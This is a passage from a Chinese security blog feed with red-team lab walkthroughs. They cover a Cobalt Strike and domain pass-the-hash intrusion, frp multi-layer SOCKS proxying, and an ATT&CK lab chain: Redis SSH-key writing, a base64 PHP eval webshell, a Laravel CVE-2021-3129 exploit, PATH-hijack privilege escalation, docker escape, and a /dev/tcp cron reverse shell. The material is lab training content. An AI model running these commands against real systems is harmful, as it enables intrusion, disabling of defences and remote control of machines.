src="https://raw.githubusercontent.com/chencicici/images/main/202209151725066.png"></p><p>远程关掉windefend、防火墙，能关的全关了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151909483.png"></p><p>上传cs的后门</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151911208.png"></p><p>转发到smb监听器，在内网更隐蔽</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151912154.png"></p><h2 id="内网OA"><a href="#内网OA" class="headerlink" title="内网OA"></a>内网OA</h2><p>发现一台存活主机</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152106582.png"></p><p>扫一下端口，只开放了80和5985</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152114893.png"></p><p>浏览器挂个代理再访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152120439.png"></p><p>发现是通达OA</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152121041.png"></p><p>掏出利用工具，也要用porxychains代理</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152126865.png"></p><p>掏出蚁剑，也要走kali的代理</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152127029.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152128330.png"></p><p>同样上线到cs，需要中转上线，因为这台OA是不出网的，我们要通过已经拿下的web服务器来转发流量</p><p>选择转发上线</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152139191.png"></p><p>ip地址填能连通OA的那个网卡的ip</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152138468.png"></p><p>生成后门</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152136140.png"></p><p>通过蚁剑上传运行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152145033.png"></p><p>OA成功上线cs</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152145055.png"></p><h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现两张网卡</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152150249.png"></p><p>而且存在域</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152154075.png"></p><p>抓一下密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152157128.png"></p><p>关闭防火墙</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152202522.png"></p><p>把360也关了，所有防护全部关掉</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152203461.png"></p><p>发现另一网段存活主机</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152155272.png"></p><p>fscan扫描发现域控，空时存在ms17010</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152222333.png"></p><h2 id="永恒之蓝打DC"><a href="#永恒之蓝打DC" class="headerlink" title="永恒之蓝打DC"></a>永恒之蓝打DC</h2><p>cs起一个代理</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152253802.png"></p><p>复制到msf中</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152253091.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152254287.png"></p><p>使用正向payload，但是打蓝屏了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152255119.png"></p><h2 id="pth域横向"><a href="#pth域横向" class="headerlink" title="pth域横向"></a>pth域横向</h2><p>直接横向失败，应该是跟我们改过密码有关系（最开始登录域控要修改密码）</p><p>回到cs，查看进程发现域管理员在线，窃取令牌</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152313539.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152314119.png"></p><p>抓取密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152345522.png"></p><p>解密出来就是我们修改过的密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152348240.png"></p><p>利用刚刚cs搭建的socks4隧道远程登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152349713.png"></p><p>输入账号密码 attack\administrator  ！@#QWEasd123.</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152350030.png"></p><p>利用远程桌面复制cs的shell（和上面的转发shell一样的后门），上线cs</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209160010540.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;使用的是暗月提供的环境，直接打开虚拟机运行&lt;/p&gt;
&lt;h2 id=&quot;网络环境&quot;&gt;&lt;a href=&quot;#网络环境&quot; class=&quot;headerlink&quot; title=&quot;网络环境&quot;&gt;&lt;/a&gt;网络环境&lt;/h2&gt;&lt;p&gt;添加两张网卡，web的第一张网卡为桥接模式，需要进入系统修改为自动获取ip&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202209151041618.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="免杀" scheme="https://syst1m.top/tags/%E5%85%8D%E6%9D%80/"/>
    
    <category term="过狗" scheme="https://syst1m.top/tags/%E8%BF%87%E7%8B%97/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之frp多级代理</title>
    <link href="https://syst1m.top/2022/08/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86/"/>
    <id>https://syst1m.top/2022/08/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86/</id>
    <published>2022-08-30T08:08:37.000Z</published>
    <updated>2022-08-31T11:56:47.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>攻击机kali，net模式模拟出网：172.16.17.140</p><p>web靶机ubuntu1双网卡，net模式为出网网卡：172.16.17.137&#x2F;自定义网卡vm1模拟第一层内网：192.168.20.129</p><p>内网域内靶机ubuntu2双网卡，vm1网卡在第一层网络：192.168.20.130&#x2F;vm2网卡为第二层内网：192.168.30.129</p><ul><li>外网入口</li></ul><p>172.16.17.0&#x2F;24</p><ul><li>一层内网</li></ul><p>192.168.20.0&#x2F;24</p><ul><li>二层内网</li></ul><p>192.168.30.0&#x2F;24</p><p>每台PC上都有一个web服务，内网主机除边缘win7外全部不出网，内网同<a href="https://so.csdn.net/so/search?q=%E7%BD%91%E6%AE%B5&spm=1001.2101.3001.7020">网段</a>之间的主机可以相互访问,不同网段相互隔离。两个靶机分别开启web服务，区分一下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311837943.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311837382.png"></p><h1 id="一层代理"><a href="#一层代理" class="headerlink" title="一层代理"></a>一层代理</h1><p>假设我们已经拿下边界入口web网站的权限-ubuntu1，上传frp到靶机上对内网进行横向</p><p>攻击机kali配置frps.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span> <span class="comment">#服务端口</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311849259.png"></p><p>ubuntu1也就是web靶机上配置frpc.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">172.16</span>.<span class="number">17.140</span> <span class="comment">#kali的ip</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span> <span class="comment">#与服务端端口要一致</span></span><br><span class="line"><span class="section">[http_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp <span class="comment">#流量类型</span></span><br><span class="line"><span class="attr">plugin</span> = socks5 <span class="comment">#插件类型</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span> <span class="comment">#代理端口</span></span><br></pre></td></tr></table></figure><p>攻击机kali启动服务端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311856348.png"></p><p>靶机启动客户端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311902596.png"></p><h2 id="google插件代理"><a href="#google插件代理" class="headerlink" title="google插件代理"></a>google插件代理</h2><p>然后添加代理，我这里用物理机去访问，代理使用的google插件</p><p>ip为kali的ip也就是服务端，端口为客户端的代理端口6000截图的时候写错了，访问192.168.20.0&#x2F;24</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311911264.png"></p><p>成功代理到192.168.20&#x2F;24网段</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311914958.png"></p><h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h2><p>用kali自带的proxychains去代理，添加一条，所有工具都可以使用proxychains代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 6000</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311925449.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311925504.png"></p><h1 id="二层代理"><a href="#二层代理" class="headerlink" title="二层代理"></a>二层代理</h1><p>假设我们现在通过一层代理，可以访问到20网段的所有资产，然后我们发现存在一台不出网的主机，192.168.20.130，也就是域内靶机-ubuntu2，然后我们拿下权限之后发现还存在192.168.30.0&#x2F;24网段，现在我们需要代理到30网段去继续横向拿域控</p><p>一层代理不要掉，在kali上配置frps.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span><span class="attr">bind_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7788</span></span><br></pre></td></tr></table></figure><p>启动</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311943595.png"></p><p>边界靶机ubuntu1上配置frps.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_addr</span> = <span class="number">192.168</span>.<span class="number">20.129</span>  </span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7799</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311945905.png"></p><p>边界靶机ubuntu1上t同时配置frpc.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">172.16</span>.<span class="number">17.140</span> </span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7788</span>  </span><br><span class="line"><span class="section">[http_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">192.168</span>.<span class="number">130.129</span> </span><br><span class="line"><span class="attr">local_port</span> = <span class="number">1080</span>    </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">1080</span>  </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311944622.png"></p><p>同样上传frp到域内靶机-ubuntu2上，配置frpc.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">20.129</span> </span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7799</span>        </span><br><span class="line"><span class="section">[http_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">1080</span> </span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br></pre></td></tr></table></figure><p>启动</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311946846.png"></p><p>加上代理访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311956560.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311950709.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;攻击机kali，net模式模拟出网：172.16.17.140&lt;/p&gt;
&lt;p&gt;web靶机ubuntu1双网卡，net模式为出网网卡：172.16.17.137&amp;#x2F;自定义网卡vm1模拟第一层内网：192.168.20.129&lt;/p&gt;
&lt;p&gt;内网域内靶机ubuntu2双网卡，vm1网卡在第一层网络：192.168.20.130&amp;#x2F;vm2网卡为第二层内网：192.168.30.129&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;外网入口&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="工具使用" scheme="https://syst1m.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="frp" scheme="https://syst1m.top/tags/frp/"/>
    
  </entry>
  
  <entry>
    <title>ATT-CK红队实战靶场07</title>
    <link href="https://syst1m.top/2022/08/25/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA07/"/>
    <id>https://syst1m.top/2022/08/25/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA07/</id>
    <published>2022-08-25T08:53:52.000Z</published>
    <updated>2022-10-21T06:09:00.066Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>整个靶场环境一共五个靶机（总共27.8 GB），分别位于三层网络环境中：</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251702067.png"></p><ul><li><p>DMZ区IP段为192.168.1.1&#x2F;24 复制物理机网络</p></li><li><p>第二层网络环境IP段为192.168.52.1&#x2F;24</p></li><li><p>第三层网络环境IP段为192.168.93.1&#x2F;24</p></li></ul><h2 id="网络设置"><a href="#网络设置" class="headerlink" title="网络设置"></a>网络设置</h2><p>在Vmware中新增两个虚拟网卡VMnet8、VMnet14。VMnet8设为默认的NAT模式，IP段设为</p><p>192.168.52.0&#x2F;24；VMnet14设为仅主机模式，IP段设为192.168.93.0&#x2F;24：</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251704032.png"></p><p>将VMnet8作为第二层网络的网卡，VMnet14作为第三层网络的网卡。这样，第二层网络中的所有主机</p><p>皆可以上网，但是位于第三层网络中的所有主机都不与外网相连通，不能上网。</p><p><strong>DMZ区域：</strong></p><p>给Ubuntu (Web 1) 配置了两个网卡，一个桥接可以对外提供服务；一个连接在VMnet8上连通第二</p><p>层网络。</p><p><strong>第二层网络区域：</strong></p><p>给Ubuntu (Web 2) 和Windows 7 (PC 1)都配置了两个网卡，一个连接在VMnet8上连通第二层网</p><p>络，一个连接在VMnet14上连通第三层网络。</p><p><strong>第三次网络区域：</strong></p><p>给Windows Server 2012和Windows 7 (PC 2)都只配置了一个网卡，一个连接在VMnet14上连通第</p><p>三层网络。</p><h2 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h2><p>靶场中各个主机都运行着相应的服务并且没有自启功能，如果你关闭了靶机，再次启动时还需要在相应</p><p>的主机上启动靶机服务（有的需要加上sudo执行）：</p><p><strong>DMZ区的Ubuntu需要启动nginx服务：</strong></p><p>redis-server &#x2F;etc&#x2F;redis.conf</p><p>&#x2F;usr&#x2F;sbin&#x2F;nginx -c &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p><p>iptables -F</p><p><strong>第二层网络的Ubuntu需要启动docker容器：</strong></p><p>sudo service docker start</p><p>sudo docker start 8e172820ac78</p><p><strong>第三层网络的Windows 7PC 2）需要启动通达OA：</strong></p><p>C:\MYOA\bin\AutoConfig.exe</p><h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><p>**域用户账户和密码如下 **：</p><p>Administrator：Whoami2021</p><p>whoami：Whoami2021</p><p>bunny：Bunny2021</p><p>moretz：Moretz2021</p><p>**Ubuntu 1 **：</p><p>web：web2021</p><p>**Ubuntu 2 **：</p><p>ubuntu：ubuntu</p><p>**通达OA账户 **：</p><p>admin：admin657260</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>对dmz靶机进行端口扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251721607.png"></p><p>22端口：ssh，基本不考虑爆破</p><p>80,81端口：访问一个404一个502不知道是不是我环境搭建有问题</p><p>6379端口：redis未授权访问</p><h2 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h2><p>尝试连接，发现存在redis未授权访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251731647.png"></p><p>现在有三个利用思路：</p><p>1、写webshell</p><p>2、写ssh公钥</p><p>3、写计划任务</p><p>这里有一点限制，2和3都需要root权限启动的redis才能执行，因为我们这里是用sudo启动的redis，所以可以直接写公钥</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251736113.png"></p><p>添加首位换行，避免乱码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>;<span class="built_in">cat</span> .ssh/id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br></pre></td></tr></table></figure><p>设置备份路径并写入公钥</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251745891.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cat key.txt | redis-cli -h 192.168.31.112 -x set hack</span></span><br><span class="line">OK                                                                                                         </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># redis-cli -h 192.168.31.112                          </span></span><br><span class="line">192.168.31.112:6379&gt; CONFIG SET <span class="built_in">dir</span> /root/.ssh</span><br><span class="line">OK</span><br><span class="line">192.168.31.112:6379&gt; config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.31.112:6379&gt; get hack</span><br><span class="line">OK</span><br><span class="line">192.168.31.112:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>ssh免密登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251748310.png"></p><h2 id="上线到msf"><a href="#上线到msf" class="headerlink" title="上线到msf"></a>上线到msf</h2><p>使用 <code>exploit/multi/script/web_delivery</code>文件落地上线，这样比生成门后快一点</p><p>设置好payload和target</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251753859.png"></p><p>将运行结果复制到ssh shell中运行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251754223.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251755439.png"></p><p>msf收到会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251756156.png"></p><h1 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>存在两张网卡，还有另一个网段52</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251758532.png"></p><p>添加路由把msf代理进去</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251802768.png"></p><p>msf主机存活扫描模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/discovery/arp_sweep   ARP扫描</span><br><span class="line">auxiliary/scanner/discovery/udp_sweep   UDP扫描</span><br><span class="line">auxiliary/scanner/netbios/nbname        NETBIOS扫描</span><br><span class="line">auxiliary/scanner/snmp/snmp_enum        SNMP扫描</span><br><span class="line">auxiliary/scanner/smb/smb_version       SMB扫描</span><br></pre></td></tr></table></figure><p>msf端口扫描模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ack          TCP ACK端口扫描</span><br><span class="line">auxiliary/scanner/portscan/ftpbounce    FTP bounce端口扫描</span><br><span class="line">auxiliary/scanner/portscan/syn         SYN端口扫描</span><br><span class="line">auxiliary/scanner/portscan/tcp          TCP端口扫描  </span><br><span class="line">auxiliary/scanner/portscan/xmas         TCP XMas端口扫描</span><br></pre></td></tr></table></figure><p>反向代理使用nmap对52网段进行扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251822176.png"></p><p>添加代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p>nmap扫描内网太慢了，而且这样走msf的proxy模块，很不稳定，必须走tcp流量，而30靶机开启了防火墙所以一直回显denied</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251823211.png"></p><p>关了防火墙用msf模块扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251910393.png"></p><p>浏览器挂上反向代理，或者直接用proxychains打开火狐</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208281638036.png"></p><p>都存在web服务</p><p>30是通达oa</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208281643909.png"></p><p>20是Laravel</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208281644023.png"></p><h2 id="通达oa"><a href="#通达oa" class="headerlink" title="通达oa"></a>通达oa</h2><p>先看通达oa，爆出过不少漏洞，记得用proxychains代理检测工具</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208281856843.png"></p><p>蚁剑直接添加socks4代理</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208281857020.png"></p><p>直接就是system权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208282334020.png"></p><p>发现还有一个网段93&#x2F;24</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208282336253.png"></p><h2 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h2><p>52网段还存在一个Laravel框架的web服务，爆出了版本，存在漏洞</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208282340685.png"></p><p>nginx反向代理，应该就是最开始dmz区的那台主机的81端口的服务，当时我忘了开机，所以访问502</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291516580.png"></p><p>下载exp，修改url <a href="https://github.com/crisprss/Laravel_CVE-2021-3129_EXP">https://github.com/crisprss/Laravel_CVE-2021-3129_EXP</a></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291454654.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291454003.png"></p><p>先写webshell到蚁剑，用base64写马不用担心转义问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d &gt;1.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291604397.png"></p><p>做信息收集发现主机名很奇怪，存在dockerenv文件应该是docker容器了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291618083.png"></p><p>用curl上线到msf，少很多命令要自己调整一下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291620253.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291620897.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291620654.png"></p><h2 id="提权-docker-逃逸"><a href="#提权-docker-逃逸" class="headerlink" title="提权+docker 逃逸"></a>提权+docker 逃逸</h2><p>先提权再逃逸，linux提权三板斧，有个shell看看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291624635.png"></p><p>运行发现应该是个ps命令，是s权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291629184.png"></p><p>我们可以构造一个环境变量来替换这个shell文件达到提权目的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">touch</span> /tmp/ps</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt; /tmp/ps</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp/ps</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>不知道为什么蚁剑里修改环境变量没生效，到msf里修改生效了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291643013.png"></p><p>反弹一个shell到nc吧，半交互式shell方便一点</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291644021.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291644168.png"></p><p>提权完成，开始逃逸，docker逃逸一般都是特权模式逃逸，创建容器时通过添加–privileged&#x3D;true参数，将容器以特权模式起动，提权模式可以访问宿主机文件</p><p>特权模式起动的容器，实战可通过cat &#x2F;proc&#x2F;self&#x2F;status |grep Cap命令判断当前容器是否通过特权模式起（000000xfffffffff代表为特权模式起</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291649458.png"></p><p>将本地目录挂载到宿主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fdisk -l <span class="comment">#查看磁盘文件</span></span><br><span class="line"><span class="built_in">mkdir</span> /xx <span class="comment">#新建一个目录用于挂载</span></span><br><span class="line">mount /dev/sda1 /chan <span class="comment">#将宿主机/dev/sda1目录挂载到容器内</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291652293.png"></p><p>再利用计划任务反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp &amp;&amp; <span class="built_in">touch</span> shell.sh &amp;&amp; <span class="built_in">chmod</span> +x shell.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.31.119/7777 &lt;&amp;1&#x27;&quot;</span> &gt;&gt; shell.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291707522.png"></p><p>再写入计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;$a*/1 *    * * *    root  bash /tmp/shell.sh &#x27;</span> /xx/etc/crontab </span><br><span class="line"><span class="built_in">cat</span> /xx/etc/crontab</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208291708320.png"></p><p>kali监听</p><p><img 